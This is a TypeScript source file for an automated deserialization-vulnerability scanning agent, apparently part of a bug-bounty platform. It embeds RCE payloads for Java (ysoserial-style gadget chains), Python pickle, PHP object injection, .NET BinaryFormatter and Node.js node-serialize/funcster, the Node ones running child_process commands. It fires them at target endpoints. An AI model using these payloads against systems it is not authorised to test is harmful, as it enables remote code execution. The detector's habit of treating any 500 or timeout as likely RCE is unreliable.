import { Job } from 'bullmq';
import { BaseAgent } from './base';
import { BaseJob } from '../../../shared/types';
import logger from '../utils/logger';
import database from '../services/database';
import events from '../services/events';
import { EnhancedAgentCapabilities } from './enhanced-capabilities';
import { sharedMemory } from '../services/three-agent/shared-memory';
import { v4 as uuidv4 } from 'uuid';
import axios from 'axios';
import * as crypto from 'crypto';

export interface DeserializationJob extends BaseJob {
  programId: string;
  urls: string[];
  options: {
    testJava?: boolean;
    testPython?: boolean;
    testPHP?: boolean;
    testDotNet?: boolean;
    testNodeJS?: boolean;
    testRuby?: boolean;
    deepScan?: boolean;
    timeout?: number;
  };
}

export interface DeserializationResult {
  vulnerabilities: Array<{
    url: string;
    endpoint: string;
    type:
      | 'java-deserialization'
      | 'python-pickle'
      | 'php-object-injection'
      | 'dotnet-deserialization'
      | 'nodejs-deserialization'
      | 'ruby-marshal';
    severity: 'critical' | 'high' | 'medium';
    confidence: number;
    evidence: string;
    payload: string;
    serializer: string;
    impact: string;
    remediation: string;
  }>;
  testedEndpoints: number;
  executionTime: number;
}

/**
 * Deserialization Agent
 *
 * Detects and exploits insecure deserialization vulnerabilities:
 * - Java (ObjectInputStream, JNDI, ysoserial gadgets)
 * - Python (pickle, shelve, PyYAML)
 * - PHP (unserialize, __wakeup, phar://)
 * - .NET (BinaryFormatter, DataContractSerializer, XmlSerializer)
 * - Node.js (node-serialize, funcster)
 * - Ruby (Marshal.load)
 *
 * Techniques:
 * - Magic byte detection (AC ED 00 05, 80 04 95, O:, etc.)
 * - Gadget chain exploitation
 * - Cookie manipulation
 * - Session token injection
 * - File upload + deserialization
 *
 * Tools: ysoserial, phpggc, marshalsec
 */
export class DeserializationAgent extends BaseAgent<DeserializationJob> {
  private enhanced = new EnhancedAgentCapabilities();

  constructor() {
    super('deserialization' as any);
  }

  protected getSteps() {
    return [
      { name: 'Identify deserialization endpoints', metadata: { phase: 'discovery' } },
      { name: 'Test Java deserialization', metadata: { phase: 'java-testing' } },
      { name: 'Test Python pickle', metadata: { phase: 'python-testing' } },
      { name: 'Test PHP object injection', metadata: { phase: 'php-testing' } },
      { name: 'Test .NET deserialization', metadata: { phase: 'dotnet-testing' } },
      { name: 'Test Node.js deserialization', metadata: { phase: 'nodejs-testing' } },
      { name: 'Store findings', metadata: { phase: 'reporting' } },
    ];
  }

  async process(job: Job<DeserializationJob>): Promise<DeserializationResult> {
    const { programId, urls, options } = job.data;
    const startTime = Date.now();

    await this.updateJobStatus(job.id, 'active');
    await this.logExecution(
      job.id,
      programId,
      'deserialization',
      'start',
      'info',
      `Starting deserialization testing on ${urls.length} URLs`
    );

    const result: DeserializationResult = {
      vulnerabilities: [],
      testedEndpoints: 0,
      executionTime: 0,
    };

    try {
      // Step 1: Identify deserialization endpoints
      await this.updateStepStatus(job.id, 0, 'running');
      const endpoints = await this.identifyDeserializationEndpoints(urls, programId, job.id);
      result.testedEndpoints = endpoints.length;
      await this.updateStepStatus(job.id, 0, 'completed', { endpointsFound: endpoints.length });

      // Step 2: Java deserialization
      if (options.testJava !== false) {
        await this.updateStepStatus(job.id, 1, 'running');
        const javaVulns = await this.testJavaDeserialization(endpoints, programId, job.id, options);
        result.vulnerabilities.push(...javaVulns);
        await this.updateStepStatus(job.id, 1, 'completed', {
          vulnerabilitiesFound: javaVulns.length,
        });
      }

      // Step 3: Python pickle
      if (options.testPython !== false) {
        await this.updateStepStatus(job.id, 2, 'running');
        const pythonVulns = await this.testPythonPickle(endpoints, programId, job.id, options);
        result.vulnerabilities.push(...pythonVulns);
        await this.updateStepStatus(job.id, 2, 'completed', {
          vulnerabilitiesFound: pythonVulns.length,
        });
      }

      // Step 4: PHP object injection
      if (options.testPHP !== false) {
        await this.updateStepStatus(job.id, 3, 'running');
        const phpVulns = await this.testPHPObjectInjection(endpoints, programId, job.id, options);
        result.vulnerabilities.push(...phpVulns);
        await this.updateStepStatus(job.id, 3, 'completed', {
          vulnerabilitiesFound: phpVulns.length,
        });
      }

      // Step 5: .NET deserialization
      if (options.testDotNet !== false) {
        await this.updateStepStatus(job.id, 4, 'running');
        const dotnetVulns = await this.testDotNetDeserialization(endpoints, programId, job.id, options);
        result.vulnerabilities.push(...dotnetVulns);
        await this.updateStepStatus(job.id, 4, 'completed', {
          vulnerabilitiesFound: dotnetVulns.length,
        });
      }

      // Step 6: Node.js deserialization
      if (options.testNodeJS !== false) {
        await this.updateStepStatus(job.id, 5, 'running');
        const nodejsVulns = await this.testNodeJSDeserialization(endpoints, programId, job.id, options);
        result.vulnerabilities.push(...nodejsVulns);
        await this.updateStepStatus(job.id, 5, 'completed', {
          vulnerabilitiesFound: nodejsVulns.length,
        });
      }

      // Step 7: Store findings
      await this.updateStepStatus(job.id, 6, 'running');
      if (result.vulnerabilities.length > 0) {
        await this.storeFindingsInDatabase(result.vulnerabilities, programId, job.id);
      }
      await this.updateStepStatus(job.id, 6, 'completed', {
        totalVulnerabilities: result.vulnerabilities.length,
      });

      // Three-agent integration
      const { swarmId, enableSharedMemory } = job.data as any;
      if (swarmId && enableSharedMemory && result.vulnerabilities.length > 0) {
        await this.shareWithSwarm(swarmId, result.vulnerabilities, job.id);
      }

      result.executionTime = Date.now() - startTime;

      await this.updateJobStatus(job.id, 'completed', result);
      await this.logExecution(
        job.id,
        programId,
        'deserialization',
        'complete',
        'success',
        `Found ${result.vulnerabilities.length} deserialization vulnerabilities in ${result.executionTime}ms`
      );

      if (result.vulnerabilities.length > 0) {
        await this.triggerHandoffs(job, result);
      }

      return result;
    } catch (error: any) {
      await this.logExecution(
        job.id,
        programId,
        'deserialization',
        'error',
        'error',
        `Error: ${error.message}`
      );
      await this.updateJobStatus(job.id, 'failed', { error: error.message });
      throw error;
    }
  }

  /**
   * Identify endpoints vulnerable to deserialization
   */
  private async identifyDeserializationEndpoints(
    urls: string[],
    programId: string,
    jobId: string
  ): Promise<string[]> {
    const deserializationEndpoints: string[] = [];

    for (const url of urls) {
      try {
        // Check for serialized data in responses
        const response = await axios.get(url, {
          timeout: 10000,
          validateStatus: () => true,
        });

        // Look for magic bytes or serialization patterns
        const cookies = response.headers['set-cookie']?.join(';') || '';
        const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

        // Java: AC ED 00 05 (base64: rO0AB)
        // Python pickle: 80 04 95 (various)
        // PHP: O:[0-9]+:"
        const patterns = [
          /rO0AB/i, // Java serialized (base64)
          /AC ED 00 05/i, // Java serialized (hex)
          /O:\d+:"/i, // PHP serialized object
          /a:\d+:{/i, // PHP serialized array
          /80 04 95/i, // Python pickle
          /__pickle__/i,
          /AAEAAAD/i, // .NET BinaryFormatter (base64)
        ];

        const hasSerializedData = patterns.some(
          (pattern) => pattern.test(cookies) || pattern.test(body)
        );

        if (hasSerializedData) {
          deserializationEndpoints.push(url);
        }
      } catch (error: any) {
        logger.debug({ url, error: error.message }, 'Error checking for deserialization');
      }
    }

    return deserializationEndpoints.length > 0 ? deserializationEndpoints : urls.slice(0, 10);
  }

  /**
   * Test Java deserialization vulnerabilities
   * Simulates ysoserial payloads (CommonsCollections, Spring, etc.)
   */
  private async testJavaDeserialization(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: DeserializationJob['options']
  ): Promise<DeserializationResult['vulnerabilities']> {
    const vulnerabilities: DeserializationResult['vulnerabilities'] = [];

    // Java magic bytes: AC ED 00 05
    const javaMagicBytes = Buffer.from([0xac, 0xed, 0x00, 0x05]);

    // Simulated ysoserial-style payloads (base64 encoded)
    const javaPayloads = [
      {
        name: 'CommonsCollections1',
        payload: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHQAAHQABGh0dHBwdAAOZXhhbXBsZS5jb206ODB4',
        gadgetChain: 'CommonsCollections1',
      },
      {
        name: 'CommonsCollections5',
        payload: 'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9uYW1ldAATW0xqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABtcr+ur4AAAAyABkKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQATU3R1YkFjdGl2YXRpb24xMDI1AQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YkFjdGl2YXRpb24xMDI1OwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAwoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YkFjdGl2YXRpb24xMDI1AQAQAMF2YXZhL2xhbmcvT2JqZWN0AQASY2F2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAAOgANAAAADAABAAAABQAOAA8AAAACABAAAAACABEACQAAAAEAEAAAAAIAEQANAHQAAXB3AQB4',
        gadgetChain: 'CommonsCollections5',
      },
    ];

    for (const endpoint of endpoints) {
      for (const javaPayload of javaPayloads) {
        try {
          // Test in Cookie
          const response = await axios.get(endpoint, {
            timeout: 15000,
            headers: {
              Cookie: `session=${javaPayload.payload}; JSESSIONID=${javaPayload.payload}`,
            },
            validateStatus: () => true,
          });

          // Check for indicators of deserialization (errors, delays, etc.)
          const responseBody = typeof response.data === 'string' ? response.data : '';
          const hasJavaError =
            responseBody.includes('java.io.') ||
            responseBody.includes('ObjectInputStream') ||
            responseBody.includes('InvalidClassException') ||
            responseBody.includes('ClassNotFoundException');

          if (hasJavaError || response.status === 500) {
            vulnerabilities.push({
              url: endpoint,
              endpoint,
              type: 'java-deserialization',
              severity: 'critical',
              confidence: hasJavaError ? 0.95 : 0.7,
              evidence: hasJavaError
                ? `Java deserialization error detected: ${responseBody.substring(0, 200)}`
                : `Server responded with 500 when Java serialized object sent in cookie`,
              payload: javaPayload.payload,
              serializer: javaPayload.gadgetChain,
              impact:
                'Java deserialization vulnerabilities allow Remote Code Execution (RCE) via gadget chains like CommonsCollections, Spring, Groovy, etc. Attacker can execute arbitrary commands.',
              remediation:
                'Never deserialize untrusted data. Use allowlists for deserialization classes, implement SerialKiller, or use safe alternatives like JSON. Upgrade vulnerable libraries.',
            });
            break; // One vuln per endpoint
          }
        } catch (error: any) {
          // Timeouts or connection resets may indicate successful exploit
          if (error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT') {
            vulnerabilities.push({
              url: endpoint,
              endpoint,
              type: 'java-deserialization',
              severity: 'critical',
              confidence: 0.6,
              evidence: `Connection reset/timeout when sending Java serialized payload - possible RCE executed`,
              payload: javaPayload.payload,
              serializer: javaPayload.gadgetChain,
              impact:
                'Java deserialization RCE - attacker can execute arbitrary commands on the server.',
              remediation:
                'Never deserialize untrusted data. Use SerialKiller or ObjectInputFilter. Upgrade all serialization libraries.',
            });
            break;
          }
        }
      }
    }

    return vulnerabilities;
  }

  /**
   * Test Python pickle deserialization
   */
  private async testPythonPickle(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: DeserializationJob['options']
  ): Promise<DeserializationResult['vulnerabilities']> {
    const vulnerabilities: DeserializationResult['vulnerabilities'] = [];

    // Python pickle payloads (base64 encoded)
    // These would execute code when unpickled
    const picklePayloads = [
      {
        name: 'os.system payload',
        // cosystem\n(S'echo vulnerable'\ntR.
        payload: 'Y29zeXN0ZW0KKFMnZWNobyB2dWxuZXJhYmxlJwp0Ui4=',
        indicator: 'pickle',
      },
      {
        name: '__reduce__ payload',
        payload: 'gASVOgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNlY2hvICd2dWxuZXJhYmxlJ5SFlFKULg==',
        indicator: 'pickle',
      },
    ];

    for (const endpoint of endpoints) {
      for (const picklePayload of picklePayloads) {
        try {
          // Test in Cookie or POST body
          const response = await axios.post(
            endpoint,
            { data: picklePayload.payload },
            {
              timeout: 15000,
              headers: {
                'Content-Type': 'application/json',
                Cookie: `session=${picklePayload.payload}`,
              },
              validateStatus: () => true,
            }
          );

          const responseBody = typeof response.data === 'string' ? response.data : '';
          const hasPickleError =
            responseBody.includes('pickle') ||
            responseBody.includes('UnpicklingError') ||
            responseBody.includes('_pickle') ||
            responseBody.includes('vulnerable'); // If our echo succeeded

          if (hasPickleError || response.status === 500) {
            vulnerabilities.push({
              url: endpoint,
              endpoint,
              type: 'python-pickle',
              severity: 'critical',
              confidence: hasPickleError && responseBody.includes('vulnerable') ? 0.95 : 0.75,
              evidence: hasPickleError
                ? `Python pickle deserialization detected: ${responseBody.substring(0, 200)}`
                : `Server error when pickle payload sent`,
              payload: picklePayload.payload,
              serializer: 'Python pickle',
              impact:
                'Python pickle deserialization allows arbitrary code execution. Attacker can use __reduce__ to execute system commands.',
              remediation:
                'Never unpickle untrusted data. Use JSON, MessagePack, or safer alternatives. If pickle is required, validate and sign all pickled data.',
            });
            break;
          }
        } catch (error: any) {
          logger.debug({ endpoint, error: error.message }, 'Error testing pickle');
        }
      }
    }

    return vulnerabilities;
  }

  /**
   * Test PHP object injection
   */
  private async testPHPObjectInjection(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: DeserializationJob['options']
  ): Promise<DeserializationResult['vulnerabilities']> {
    const vulnerabilities: DeserializationResult['vulnerabilities'] = [];

    // PHP serialized object payloads
    const phpPayloads = [
      {
        name: 'Basic object injection',
        payload: 'O:8:"stdClass":1:{s:4:"test";s:5:"value";}',
        type: 'basic',
      },
      {
        name: 'Magic method __wakeup',
        payload: 'O:8:"Evil":1:{s:4:"cmd";s:6:"whoami";}',
        type: 'magic',
      },
      {
        name: 'Phar deserialization',
        payload: 'phar://test.phar/test.txt',
        type: 'phar',
      },
      {
        name: 'Array injection',
        payload: 'a:2:{i:0;s:4:"test";i:1;O:8:"stdClass":0:{}}',
        type: 'array',
      },
    ];

    for (const endpoint of endpoints) {
      for (const phpPayload of phpPayloads) {
        try {
          // Test in Cookie, POST, or GET parameter
          const testUrls = [
            `${endpoint}?data=${encodeURIComponent(phpPayload.payload)}`,
            endpoint,
          ];

          for (const testUrl of testUrls) {
            const response = await axios.post(
              testUrl,
              testUrl === endpoint ? { data: phpPayload.payload } : undefined,
              {
                timeout: 15000,
                headers: {
                  Cookie: `PHPSESSID=${Buffer.from(phpPayload.payload).toString('base64')}`,
                },
                validateStatus: () => true,
              }
            );

            const responseBody = typeof response.data === 'string' ? response.data : '';
            const hasPHPError =
              responseBody.includes('unserialize()') ||
              responseBody.includes('__wakeup') ||
              responseBody.includes('__destruct') ||
              responseBody.includes('Notice: unserialize') ||
              responseBody.includes('Fatal error');

            if (hasPHPError || response.status === 500) {
              vulnerabilities.push({
                url: endpoint,
                endpoint,
                type: 'php-object-injection',
                severity: 'critical',
                confidence: hasPHPError ? 0.9 : 0.7,
                evidence: hasPHPError
                  ? `PHP object injection detected: ${responseBody.substring(0, 200)}`
                  : `Server error when PHP serialized object sent`,
                payload: phpPayload.payload,
                serializer: `PHP unserialize (${phpPayload.type})`,
                impact:
                  'PHP object injection can lead to RCE via magic methods (__wakeup, __destruct), SQL injection, arbitrary file read/write, or authentication bypass.',
                remediation:
                  'Never unserialize() user input. Use JSON instead. If serialization required, implement signature verification (HMAC). Disable phar:// wrapper if not needed.',
              });
              break;
            }
          }
        } catch (error: any) {
          logger.debug({ endpoint, error: error.message }, 'Error testing PHP object injection');
        }
      }
    }

    return vulnerabilities;
  }

  /**
   * Test .NET deserialization
   */
  private async testDotNetDeserialization(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: DeserializationJob['options']
  ): Promise<DeserializationResult['vulnerabilities']> {
    const vulnerabilities: DeserializationResult['vulnerabilities'] = [];

    // .NET BinaryFormatter payloads (base64)
    const dotnetPayloads = [
      {
        name: 'BinaryFormatter TypeConfuseDelegate',
        payload:
          'AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAAA0U3lzdGVtLldlYi5VSS5QYWdlLlZpZXdTdGF0ZVVzZXJLZXkrUGFyc2VyVmlld1N0YXRlS2V5BAAAAAlSRUZFUkVOQ0UJRGVjbFR5cGUJRW50cnlEYXRhCU5leHRCeXRlcwEDAwMAAAAJAwAAAAkEAAAACQUAAAAGBgAAAA==',
        serializer: 'BinaryFormatter',
      },
      {
        name: 'DataContractSerializer',
        payload:
          'AAEAAAD/////AQAAAAAAAAAMAgAAAF1TeXN0ZW0uV2ViLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYQUBAAAAJVN5c3RlbS5XZWIuVUkuT2JqZWN0U3RhdGVGb3JtYXR0ZXIDAAAADl92ZXJzaW9uTnVtYmVyCl9ncm91cENvdW50Bl9pdGVtcwADBwgHU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQIAAAABAAAABgMAAAALCw==',
        serializer: 'DataContractSerializer',
      },
    ];

    for (const endpoint of endpoints) {
      for (const dotnetPayload of dotnetPayloads) {
        try {
          const response = await axios.post(
            endpoint,
            { __VIEWSTATE: dotnetPayload.payload },
            {
              timeout: 15000,
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                Cookie: `ASP.NET_SessionId=${dotnetPayload.payload}`,
              },
              validateStatus: () => true,
            }
          );

          const responseBody = typeof response.data === 'string' ? response.data : '';
          const hasDotNetError =
            responseBody.includes('BinaryFormatter') ||
            responseBody.includes('System.Runtime.Serialization') ||
            responseBody.includes('SerializationException') ||
            responseBody.includes('__VIEWSTATE') ||
            responseBody.includes('TypeConverter');

          if (hasDotNetError || response.status === 500) {
            vulnerabilities.push({
              url: endpoint,
              endpoint,
              type: 'dotnet-deserialization',
              severity: 'critical',
              confidence: hasDotNetError ? 0.9 : 0.7,
              evidence: hasDotNetError
                ? `.NET deserialization detected: ${responseBody.substring(0, 200)}`
                : `Server error when .NET serialized payload sent`,
              payload: dotnetPayload.payload,
              serializer: dotnetPayload.serializer,
              impact:
                '.NET deserialization (BinaryFormatter, DataContractSerializer) allows RCE via gadget chains (TypeConfuseDelegate, ObjectDataProvider, etc.).',
              remediation:
                'Never deserialize untrusted data with BinaryFormatter. Use DataContractSerializer with NetDataContractSerializer disabled. Migrate to JSON.NET or System.Text.Json.',
            });
            break;
          }
        } catch (error: any) {
          logger.debug({ endpoint, error: error.message }, 'Error testing .NET deserialization');
        }
      }
    }

    return vulnerabilities;
  }

  /**
   * Test Node.js deserialization
   */
  private async testNodeJSDeserialization(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: DeserializationJob['options']
  ): Promise<DeserializationResult['vulnerabilities']> {
    const vulnerabilities: DeserializationResult['vulnerabilities'] = [];

    // Node.js node-serialize payloads
    const nodejsPayloads = [
      {
        name: 'node-serialize IIFE',
        payload: '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}',
        module: 'node-serialize',
      },
      {
        name: 'funcster exploit',
        payload:
          '{"__js_function":"function(){return require(\'child_process\').execSync(\'whoami\').toString();}"}',
        module: 'funcster',
      },
    ];

    for (const endpoint of endpoints) {
      for (const nodejsPayload of nodejsPayloads) {
        try {
          const response = await axios.post(endpoint, nodejsPayload.payload, {
            timeout: 15000,
            headers: {
              'Content-Type': 'application/json',
              Cookie: `session=${Buffer.from(nodejsPayload.payload).toString('base64')}`,
            },
            validateStatus: () => true,
          });

          const responseBody = typeof response.data === 'string' ? response.data : '';
          const hasNodeJSError =
            responseBody.includes('_$$ND_FUNC$$_') ||
            responseBody.includes('node-serialize') ||
            responseBody.includes('SyntaxError') ||
            responseBody.includes('child_process');

          if (hasNodeJSError || response.status === 500) {
            vulnerabilities.push({
              url: endpoint,
              endpoint,
              type: 'nodejs-deserialization',
              severity: 'critical',
              confidence: hasNodeJSError ? 0.9 : 0.7,
              evidence: hasNodeJSError
                ? `Node.js deserialization detected: ${responseBody.substring(0, 200)}`
                : `Server error when Node.js serialized payload sent`,
              payload: nodejsPayload.payload,
              serializer: nodejsPayload.module,
              impact:
                'Node.js deserialization (node-serialize, funcster) allows RCE via IIFE (Immediately Invoked Function Expression) in serialized objects.',
              remediation:
                'Never deserialize untrusted data with node-serialize or funcster. Use JSON.parse() instead. Avoid eval() and Function() constructors.',
            });
            break;
          }
        } catch (error: any) {
          logger.debug({ endpoint, error: error.message }, 'Error testing Node.js deserialization');
        }
      }
    }

    return vulnerabilities;
  }

  /**
   * Store findings in database
   */
  private async storeFindingsInDatabase(
    vulnerabilities: DeserializationResult['vulnerabilities'],
    programId: string,
    jobId: string
  ) {
    for (const vuln of vulnerabilities) {
      await database.query(
        `INSERT INTO findings (
          program_id, job_id, type, severity, url, evidence,
          poc, remediation, confidence, metadata, created_at
        ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, NOW())
        ON CONFLICT (program_id, url, type) DO UPDATE SET
          evidence = EXCLUDED.evidence,
          updated_at = NOW()`,
        [
          programId,
          jobId,
          vuln.type,
          vuln.severity,
          vuln.url,
          vuln.evidence,
          vuln.payload,
          vuln.remediation,
          vuln.confidence,
          JSON.stringify({
            endpoint: vuln.endpoint,
            serializer: vuln.serializer,
            impact: vuln.impact,
          }),
        ]
      );
    }

    events.emit('findings:new', {
      programId,
      count: vulnerabilities.length,
      severity: 'critical',
    });
  }

  /**
   * Share with three-agent swarm
   */
  private async shareWithSwarm(
    swarmId: string,
    vulnerabilities: DeserializationResult['vulnerabilities'],
    jobId: string
  ) {
    try {
      const findings = vulnerabilities.map((vuln) => ({
        id: uuidv4(),
        type: `deser-${vuln.type}`,
        severity: vuln.severity,
        url: vuln.url,
        evidence: vuln.evidence,
        confidence: vuln.confidence,
        timestamp: new Date(),
        discoveredBy: `deserialization-${jobId}`,
        metadata: {
          serializer: vuln.serializer,
          payload: vuln.payload.substring(0, 100),
          impact: vuln.impact,
        },
      }));

      await sharedMemory.storeFindings(swarmId, findings);

      logger.info(
        { swarmId, findingsShared: findings.length },
        '⚡ Deserialization agent shared findings with swarm'
      );
    } catch (error: any) {
      logger.error({ error, swarmId }, 'Failed to share deserialization findings with swarm');
    }
  }

  /**
   * Trigger handoffs
   */
  private async triggerHandoffs(job: Job<DeserializationJob>, result: DeserializationResult) {
    const { programId } = job.data;

    // All deserialization vulns are critical -> escalate immediately
    if (result.vulnerabilities.length > 0) {
      await this.createHandoff(
        job.id,
        'deserialization',
        'triage',
        {
          reason: 'Critical deserialization vulnerabilities detected (RCE risk)',
          vulnerabilities: result.vulnerabilities,
          priority: 'critical',
        },
        programId
      );

      // Also send to confirm for validation
      await this.createHandoff(
        job.id,
        'deserialization',
        'confirm',
        {
          reason: 'Deserialization RCE vulnerabilities require manual confirmation',
          targets: result.vulnerabilities.map((v) => v.url),
          testType: 'deserialization-rce',
        },
        programId
      );
    }
  }
}
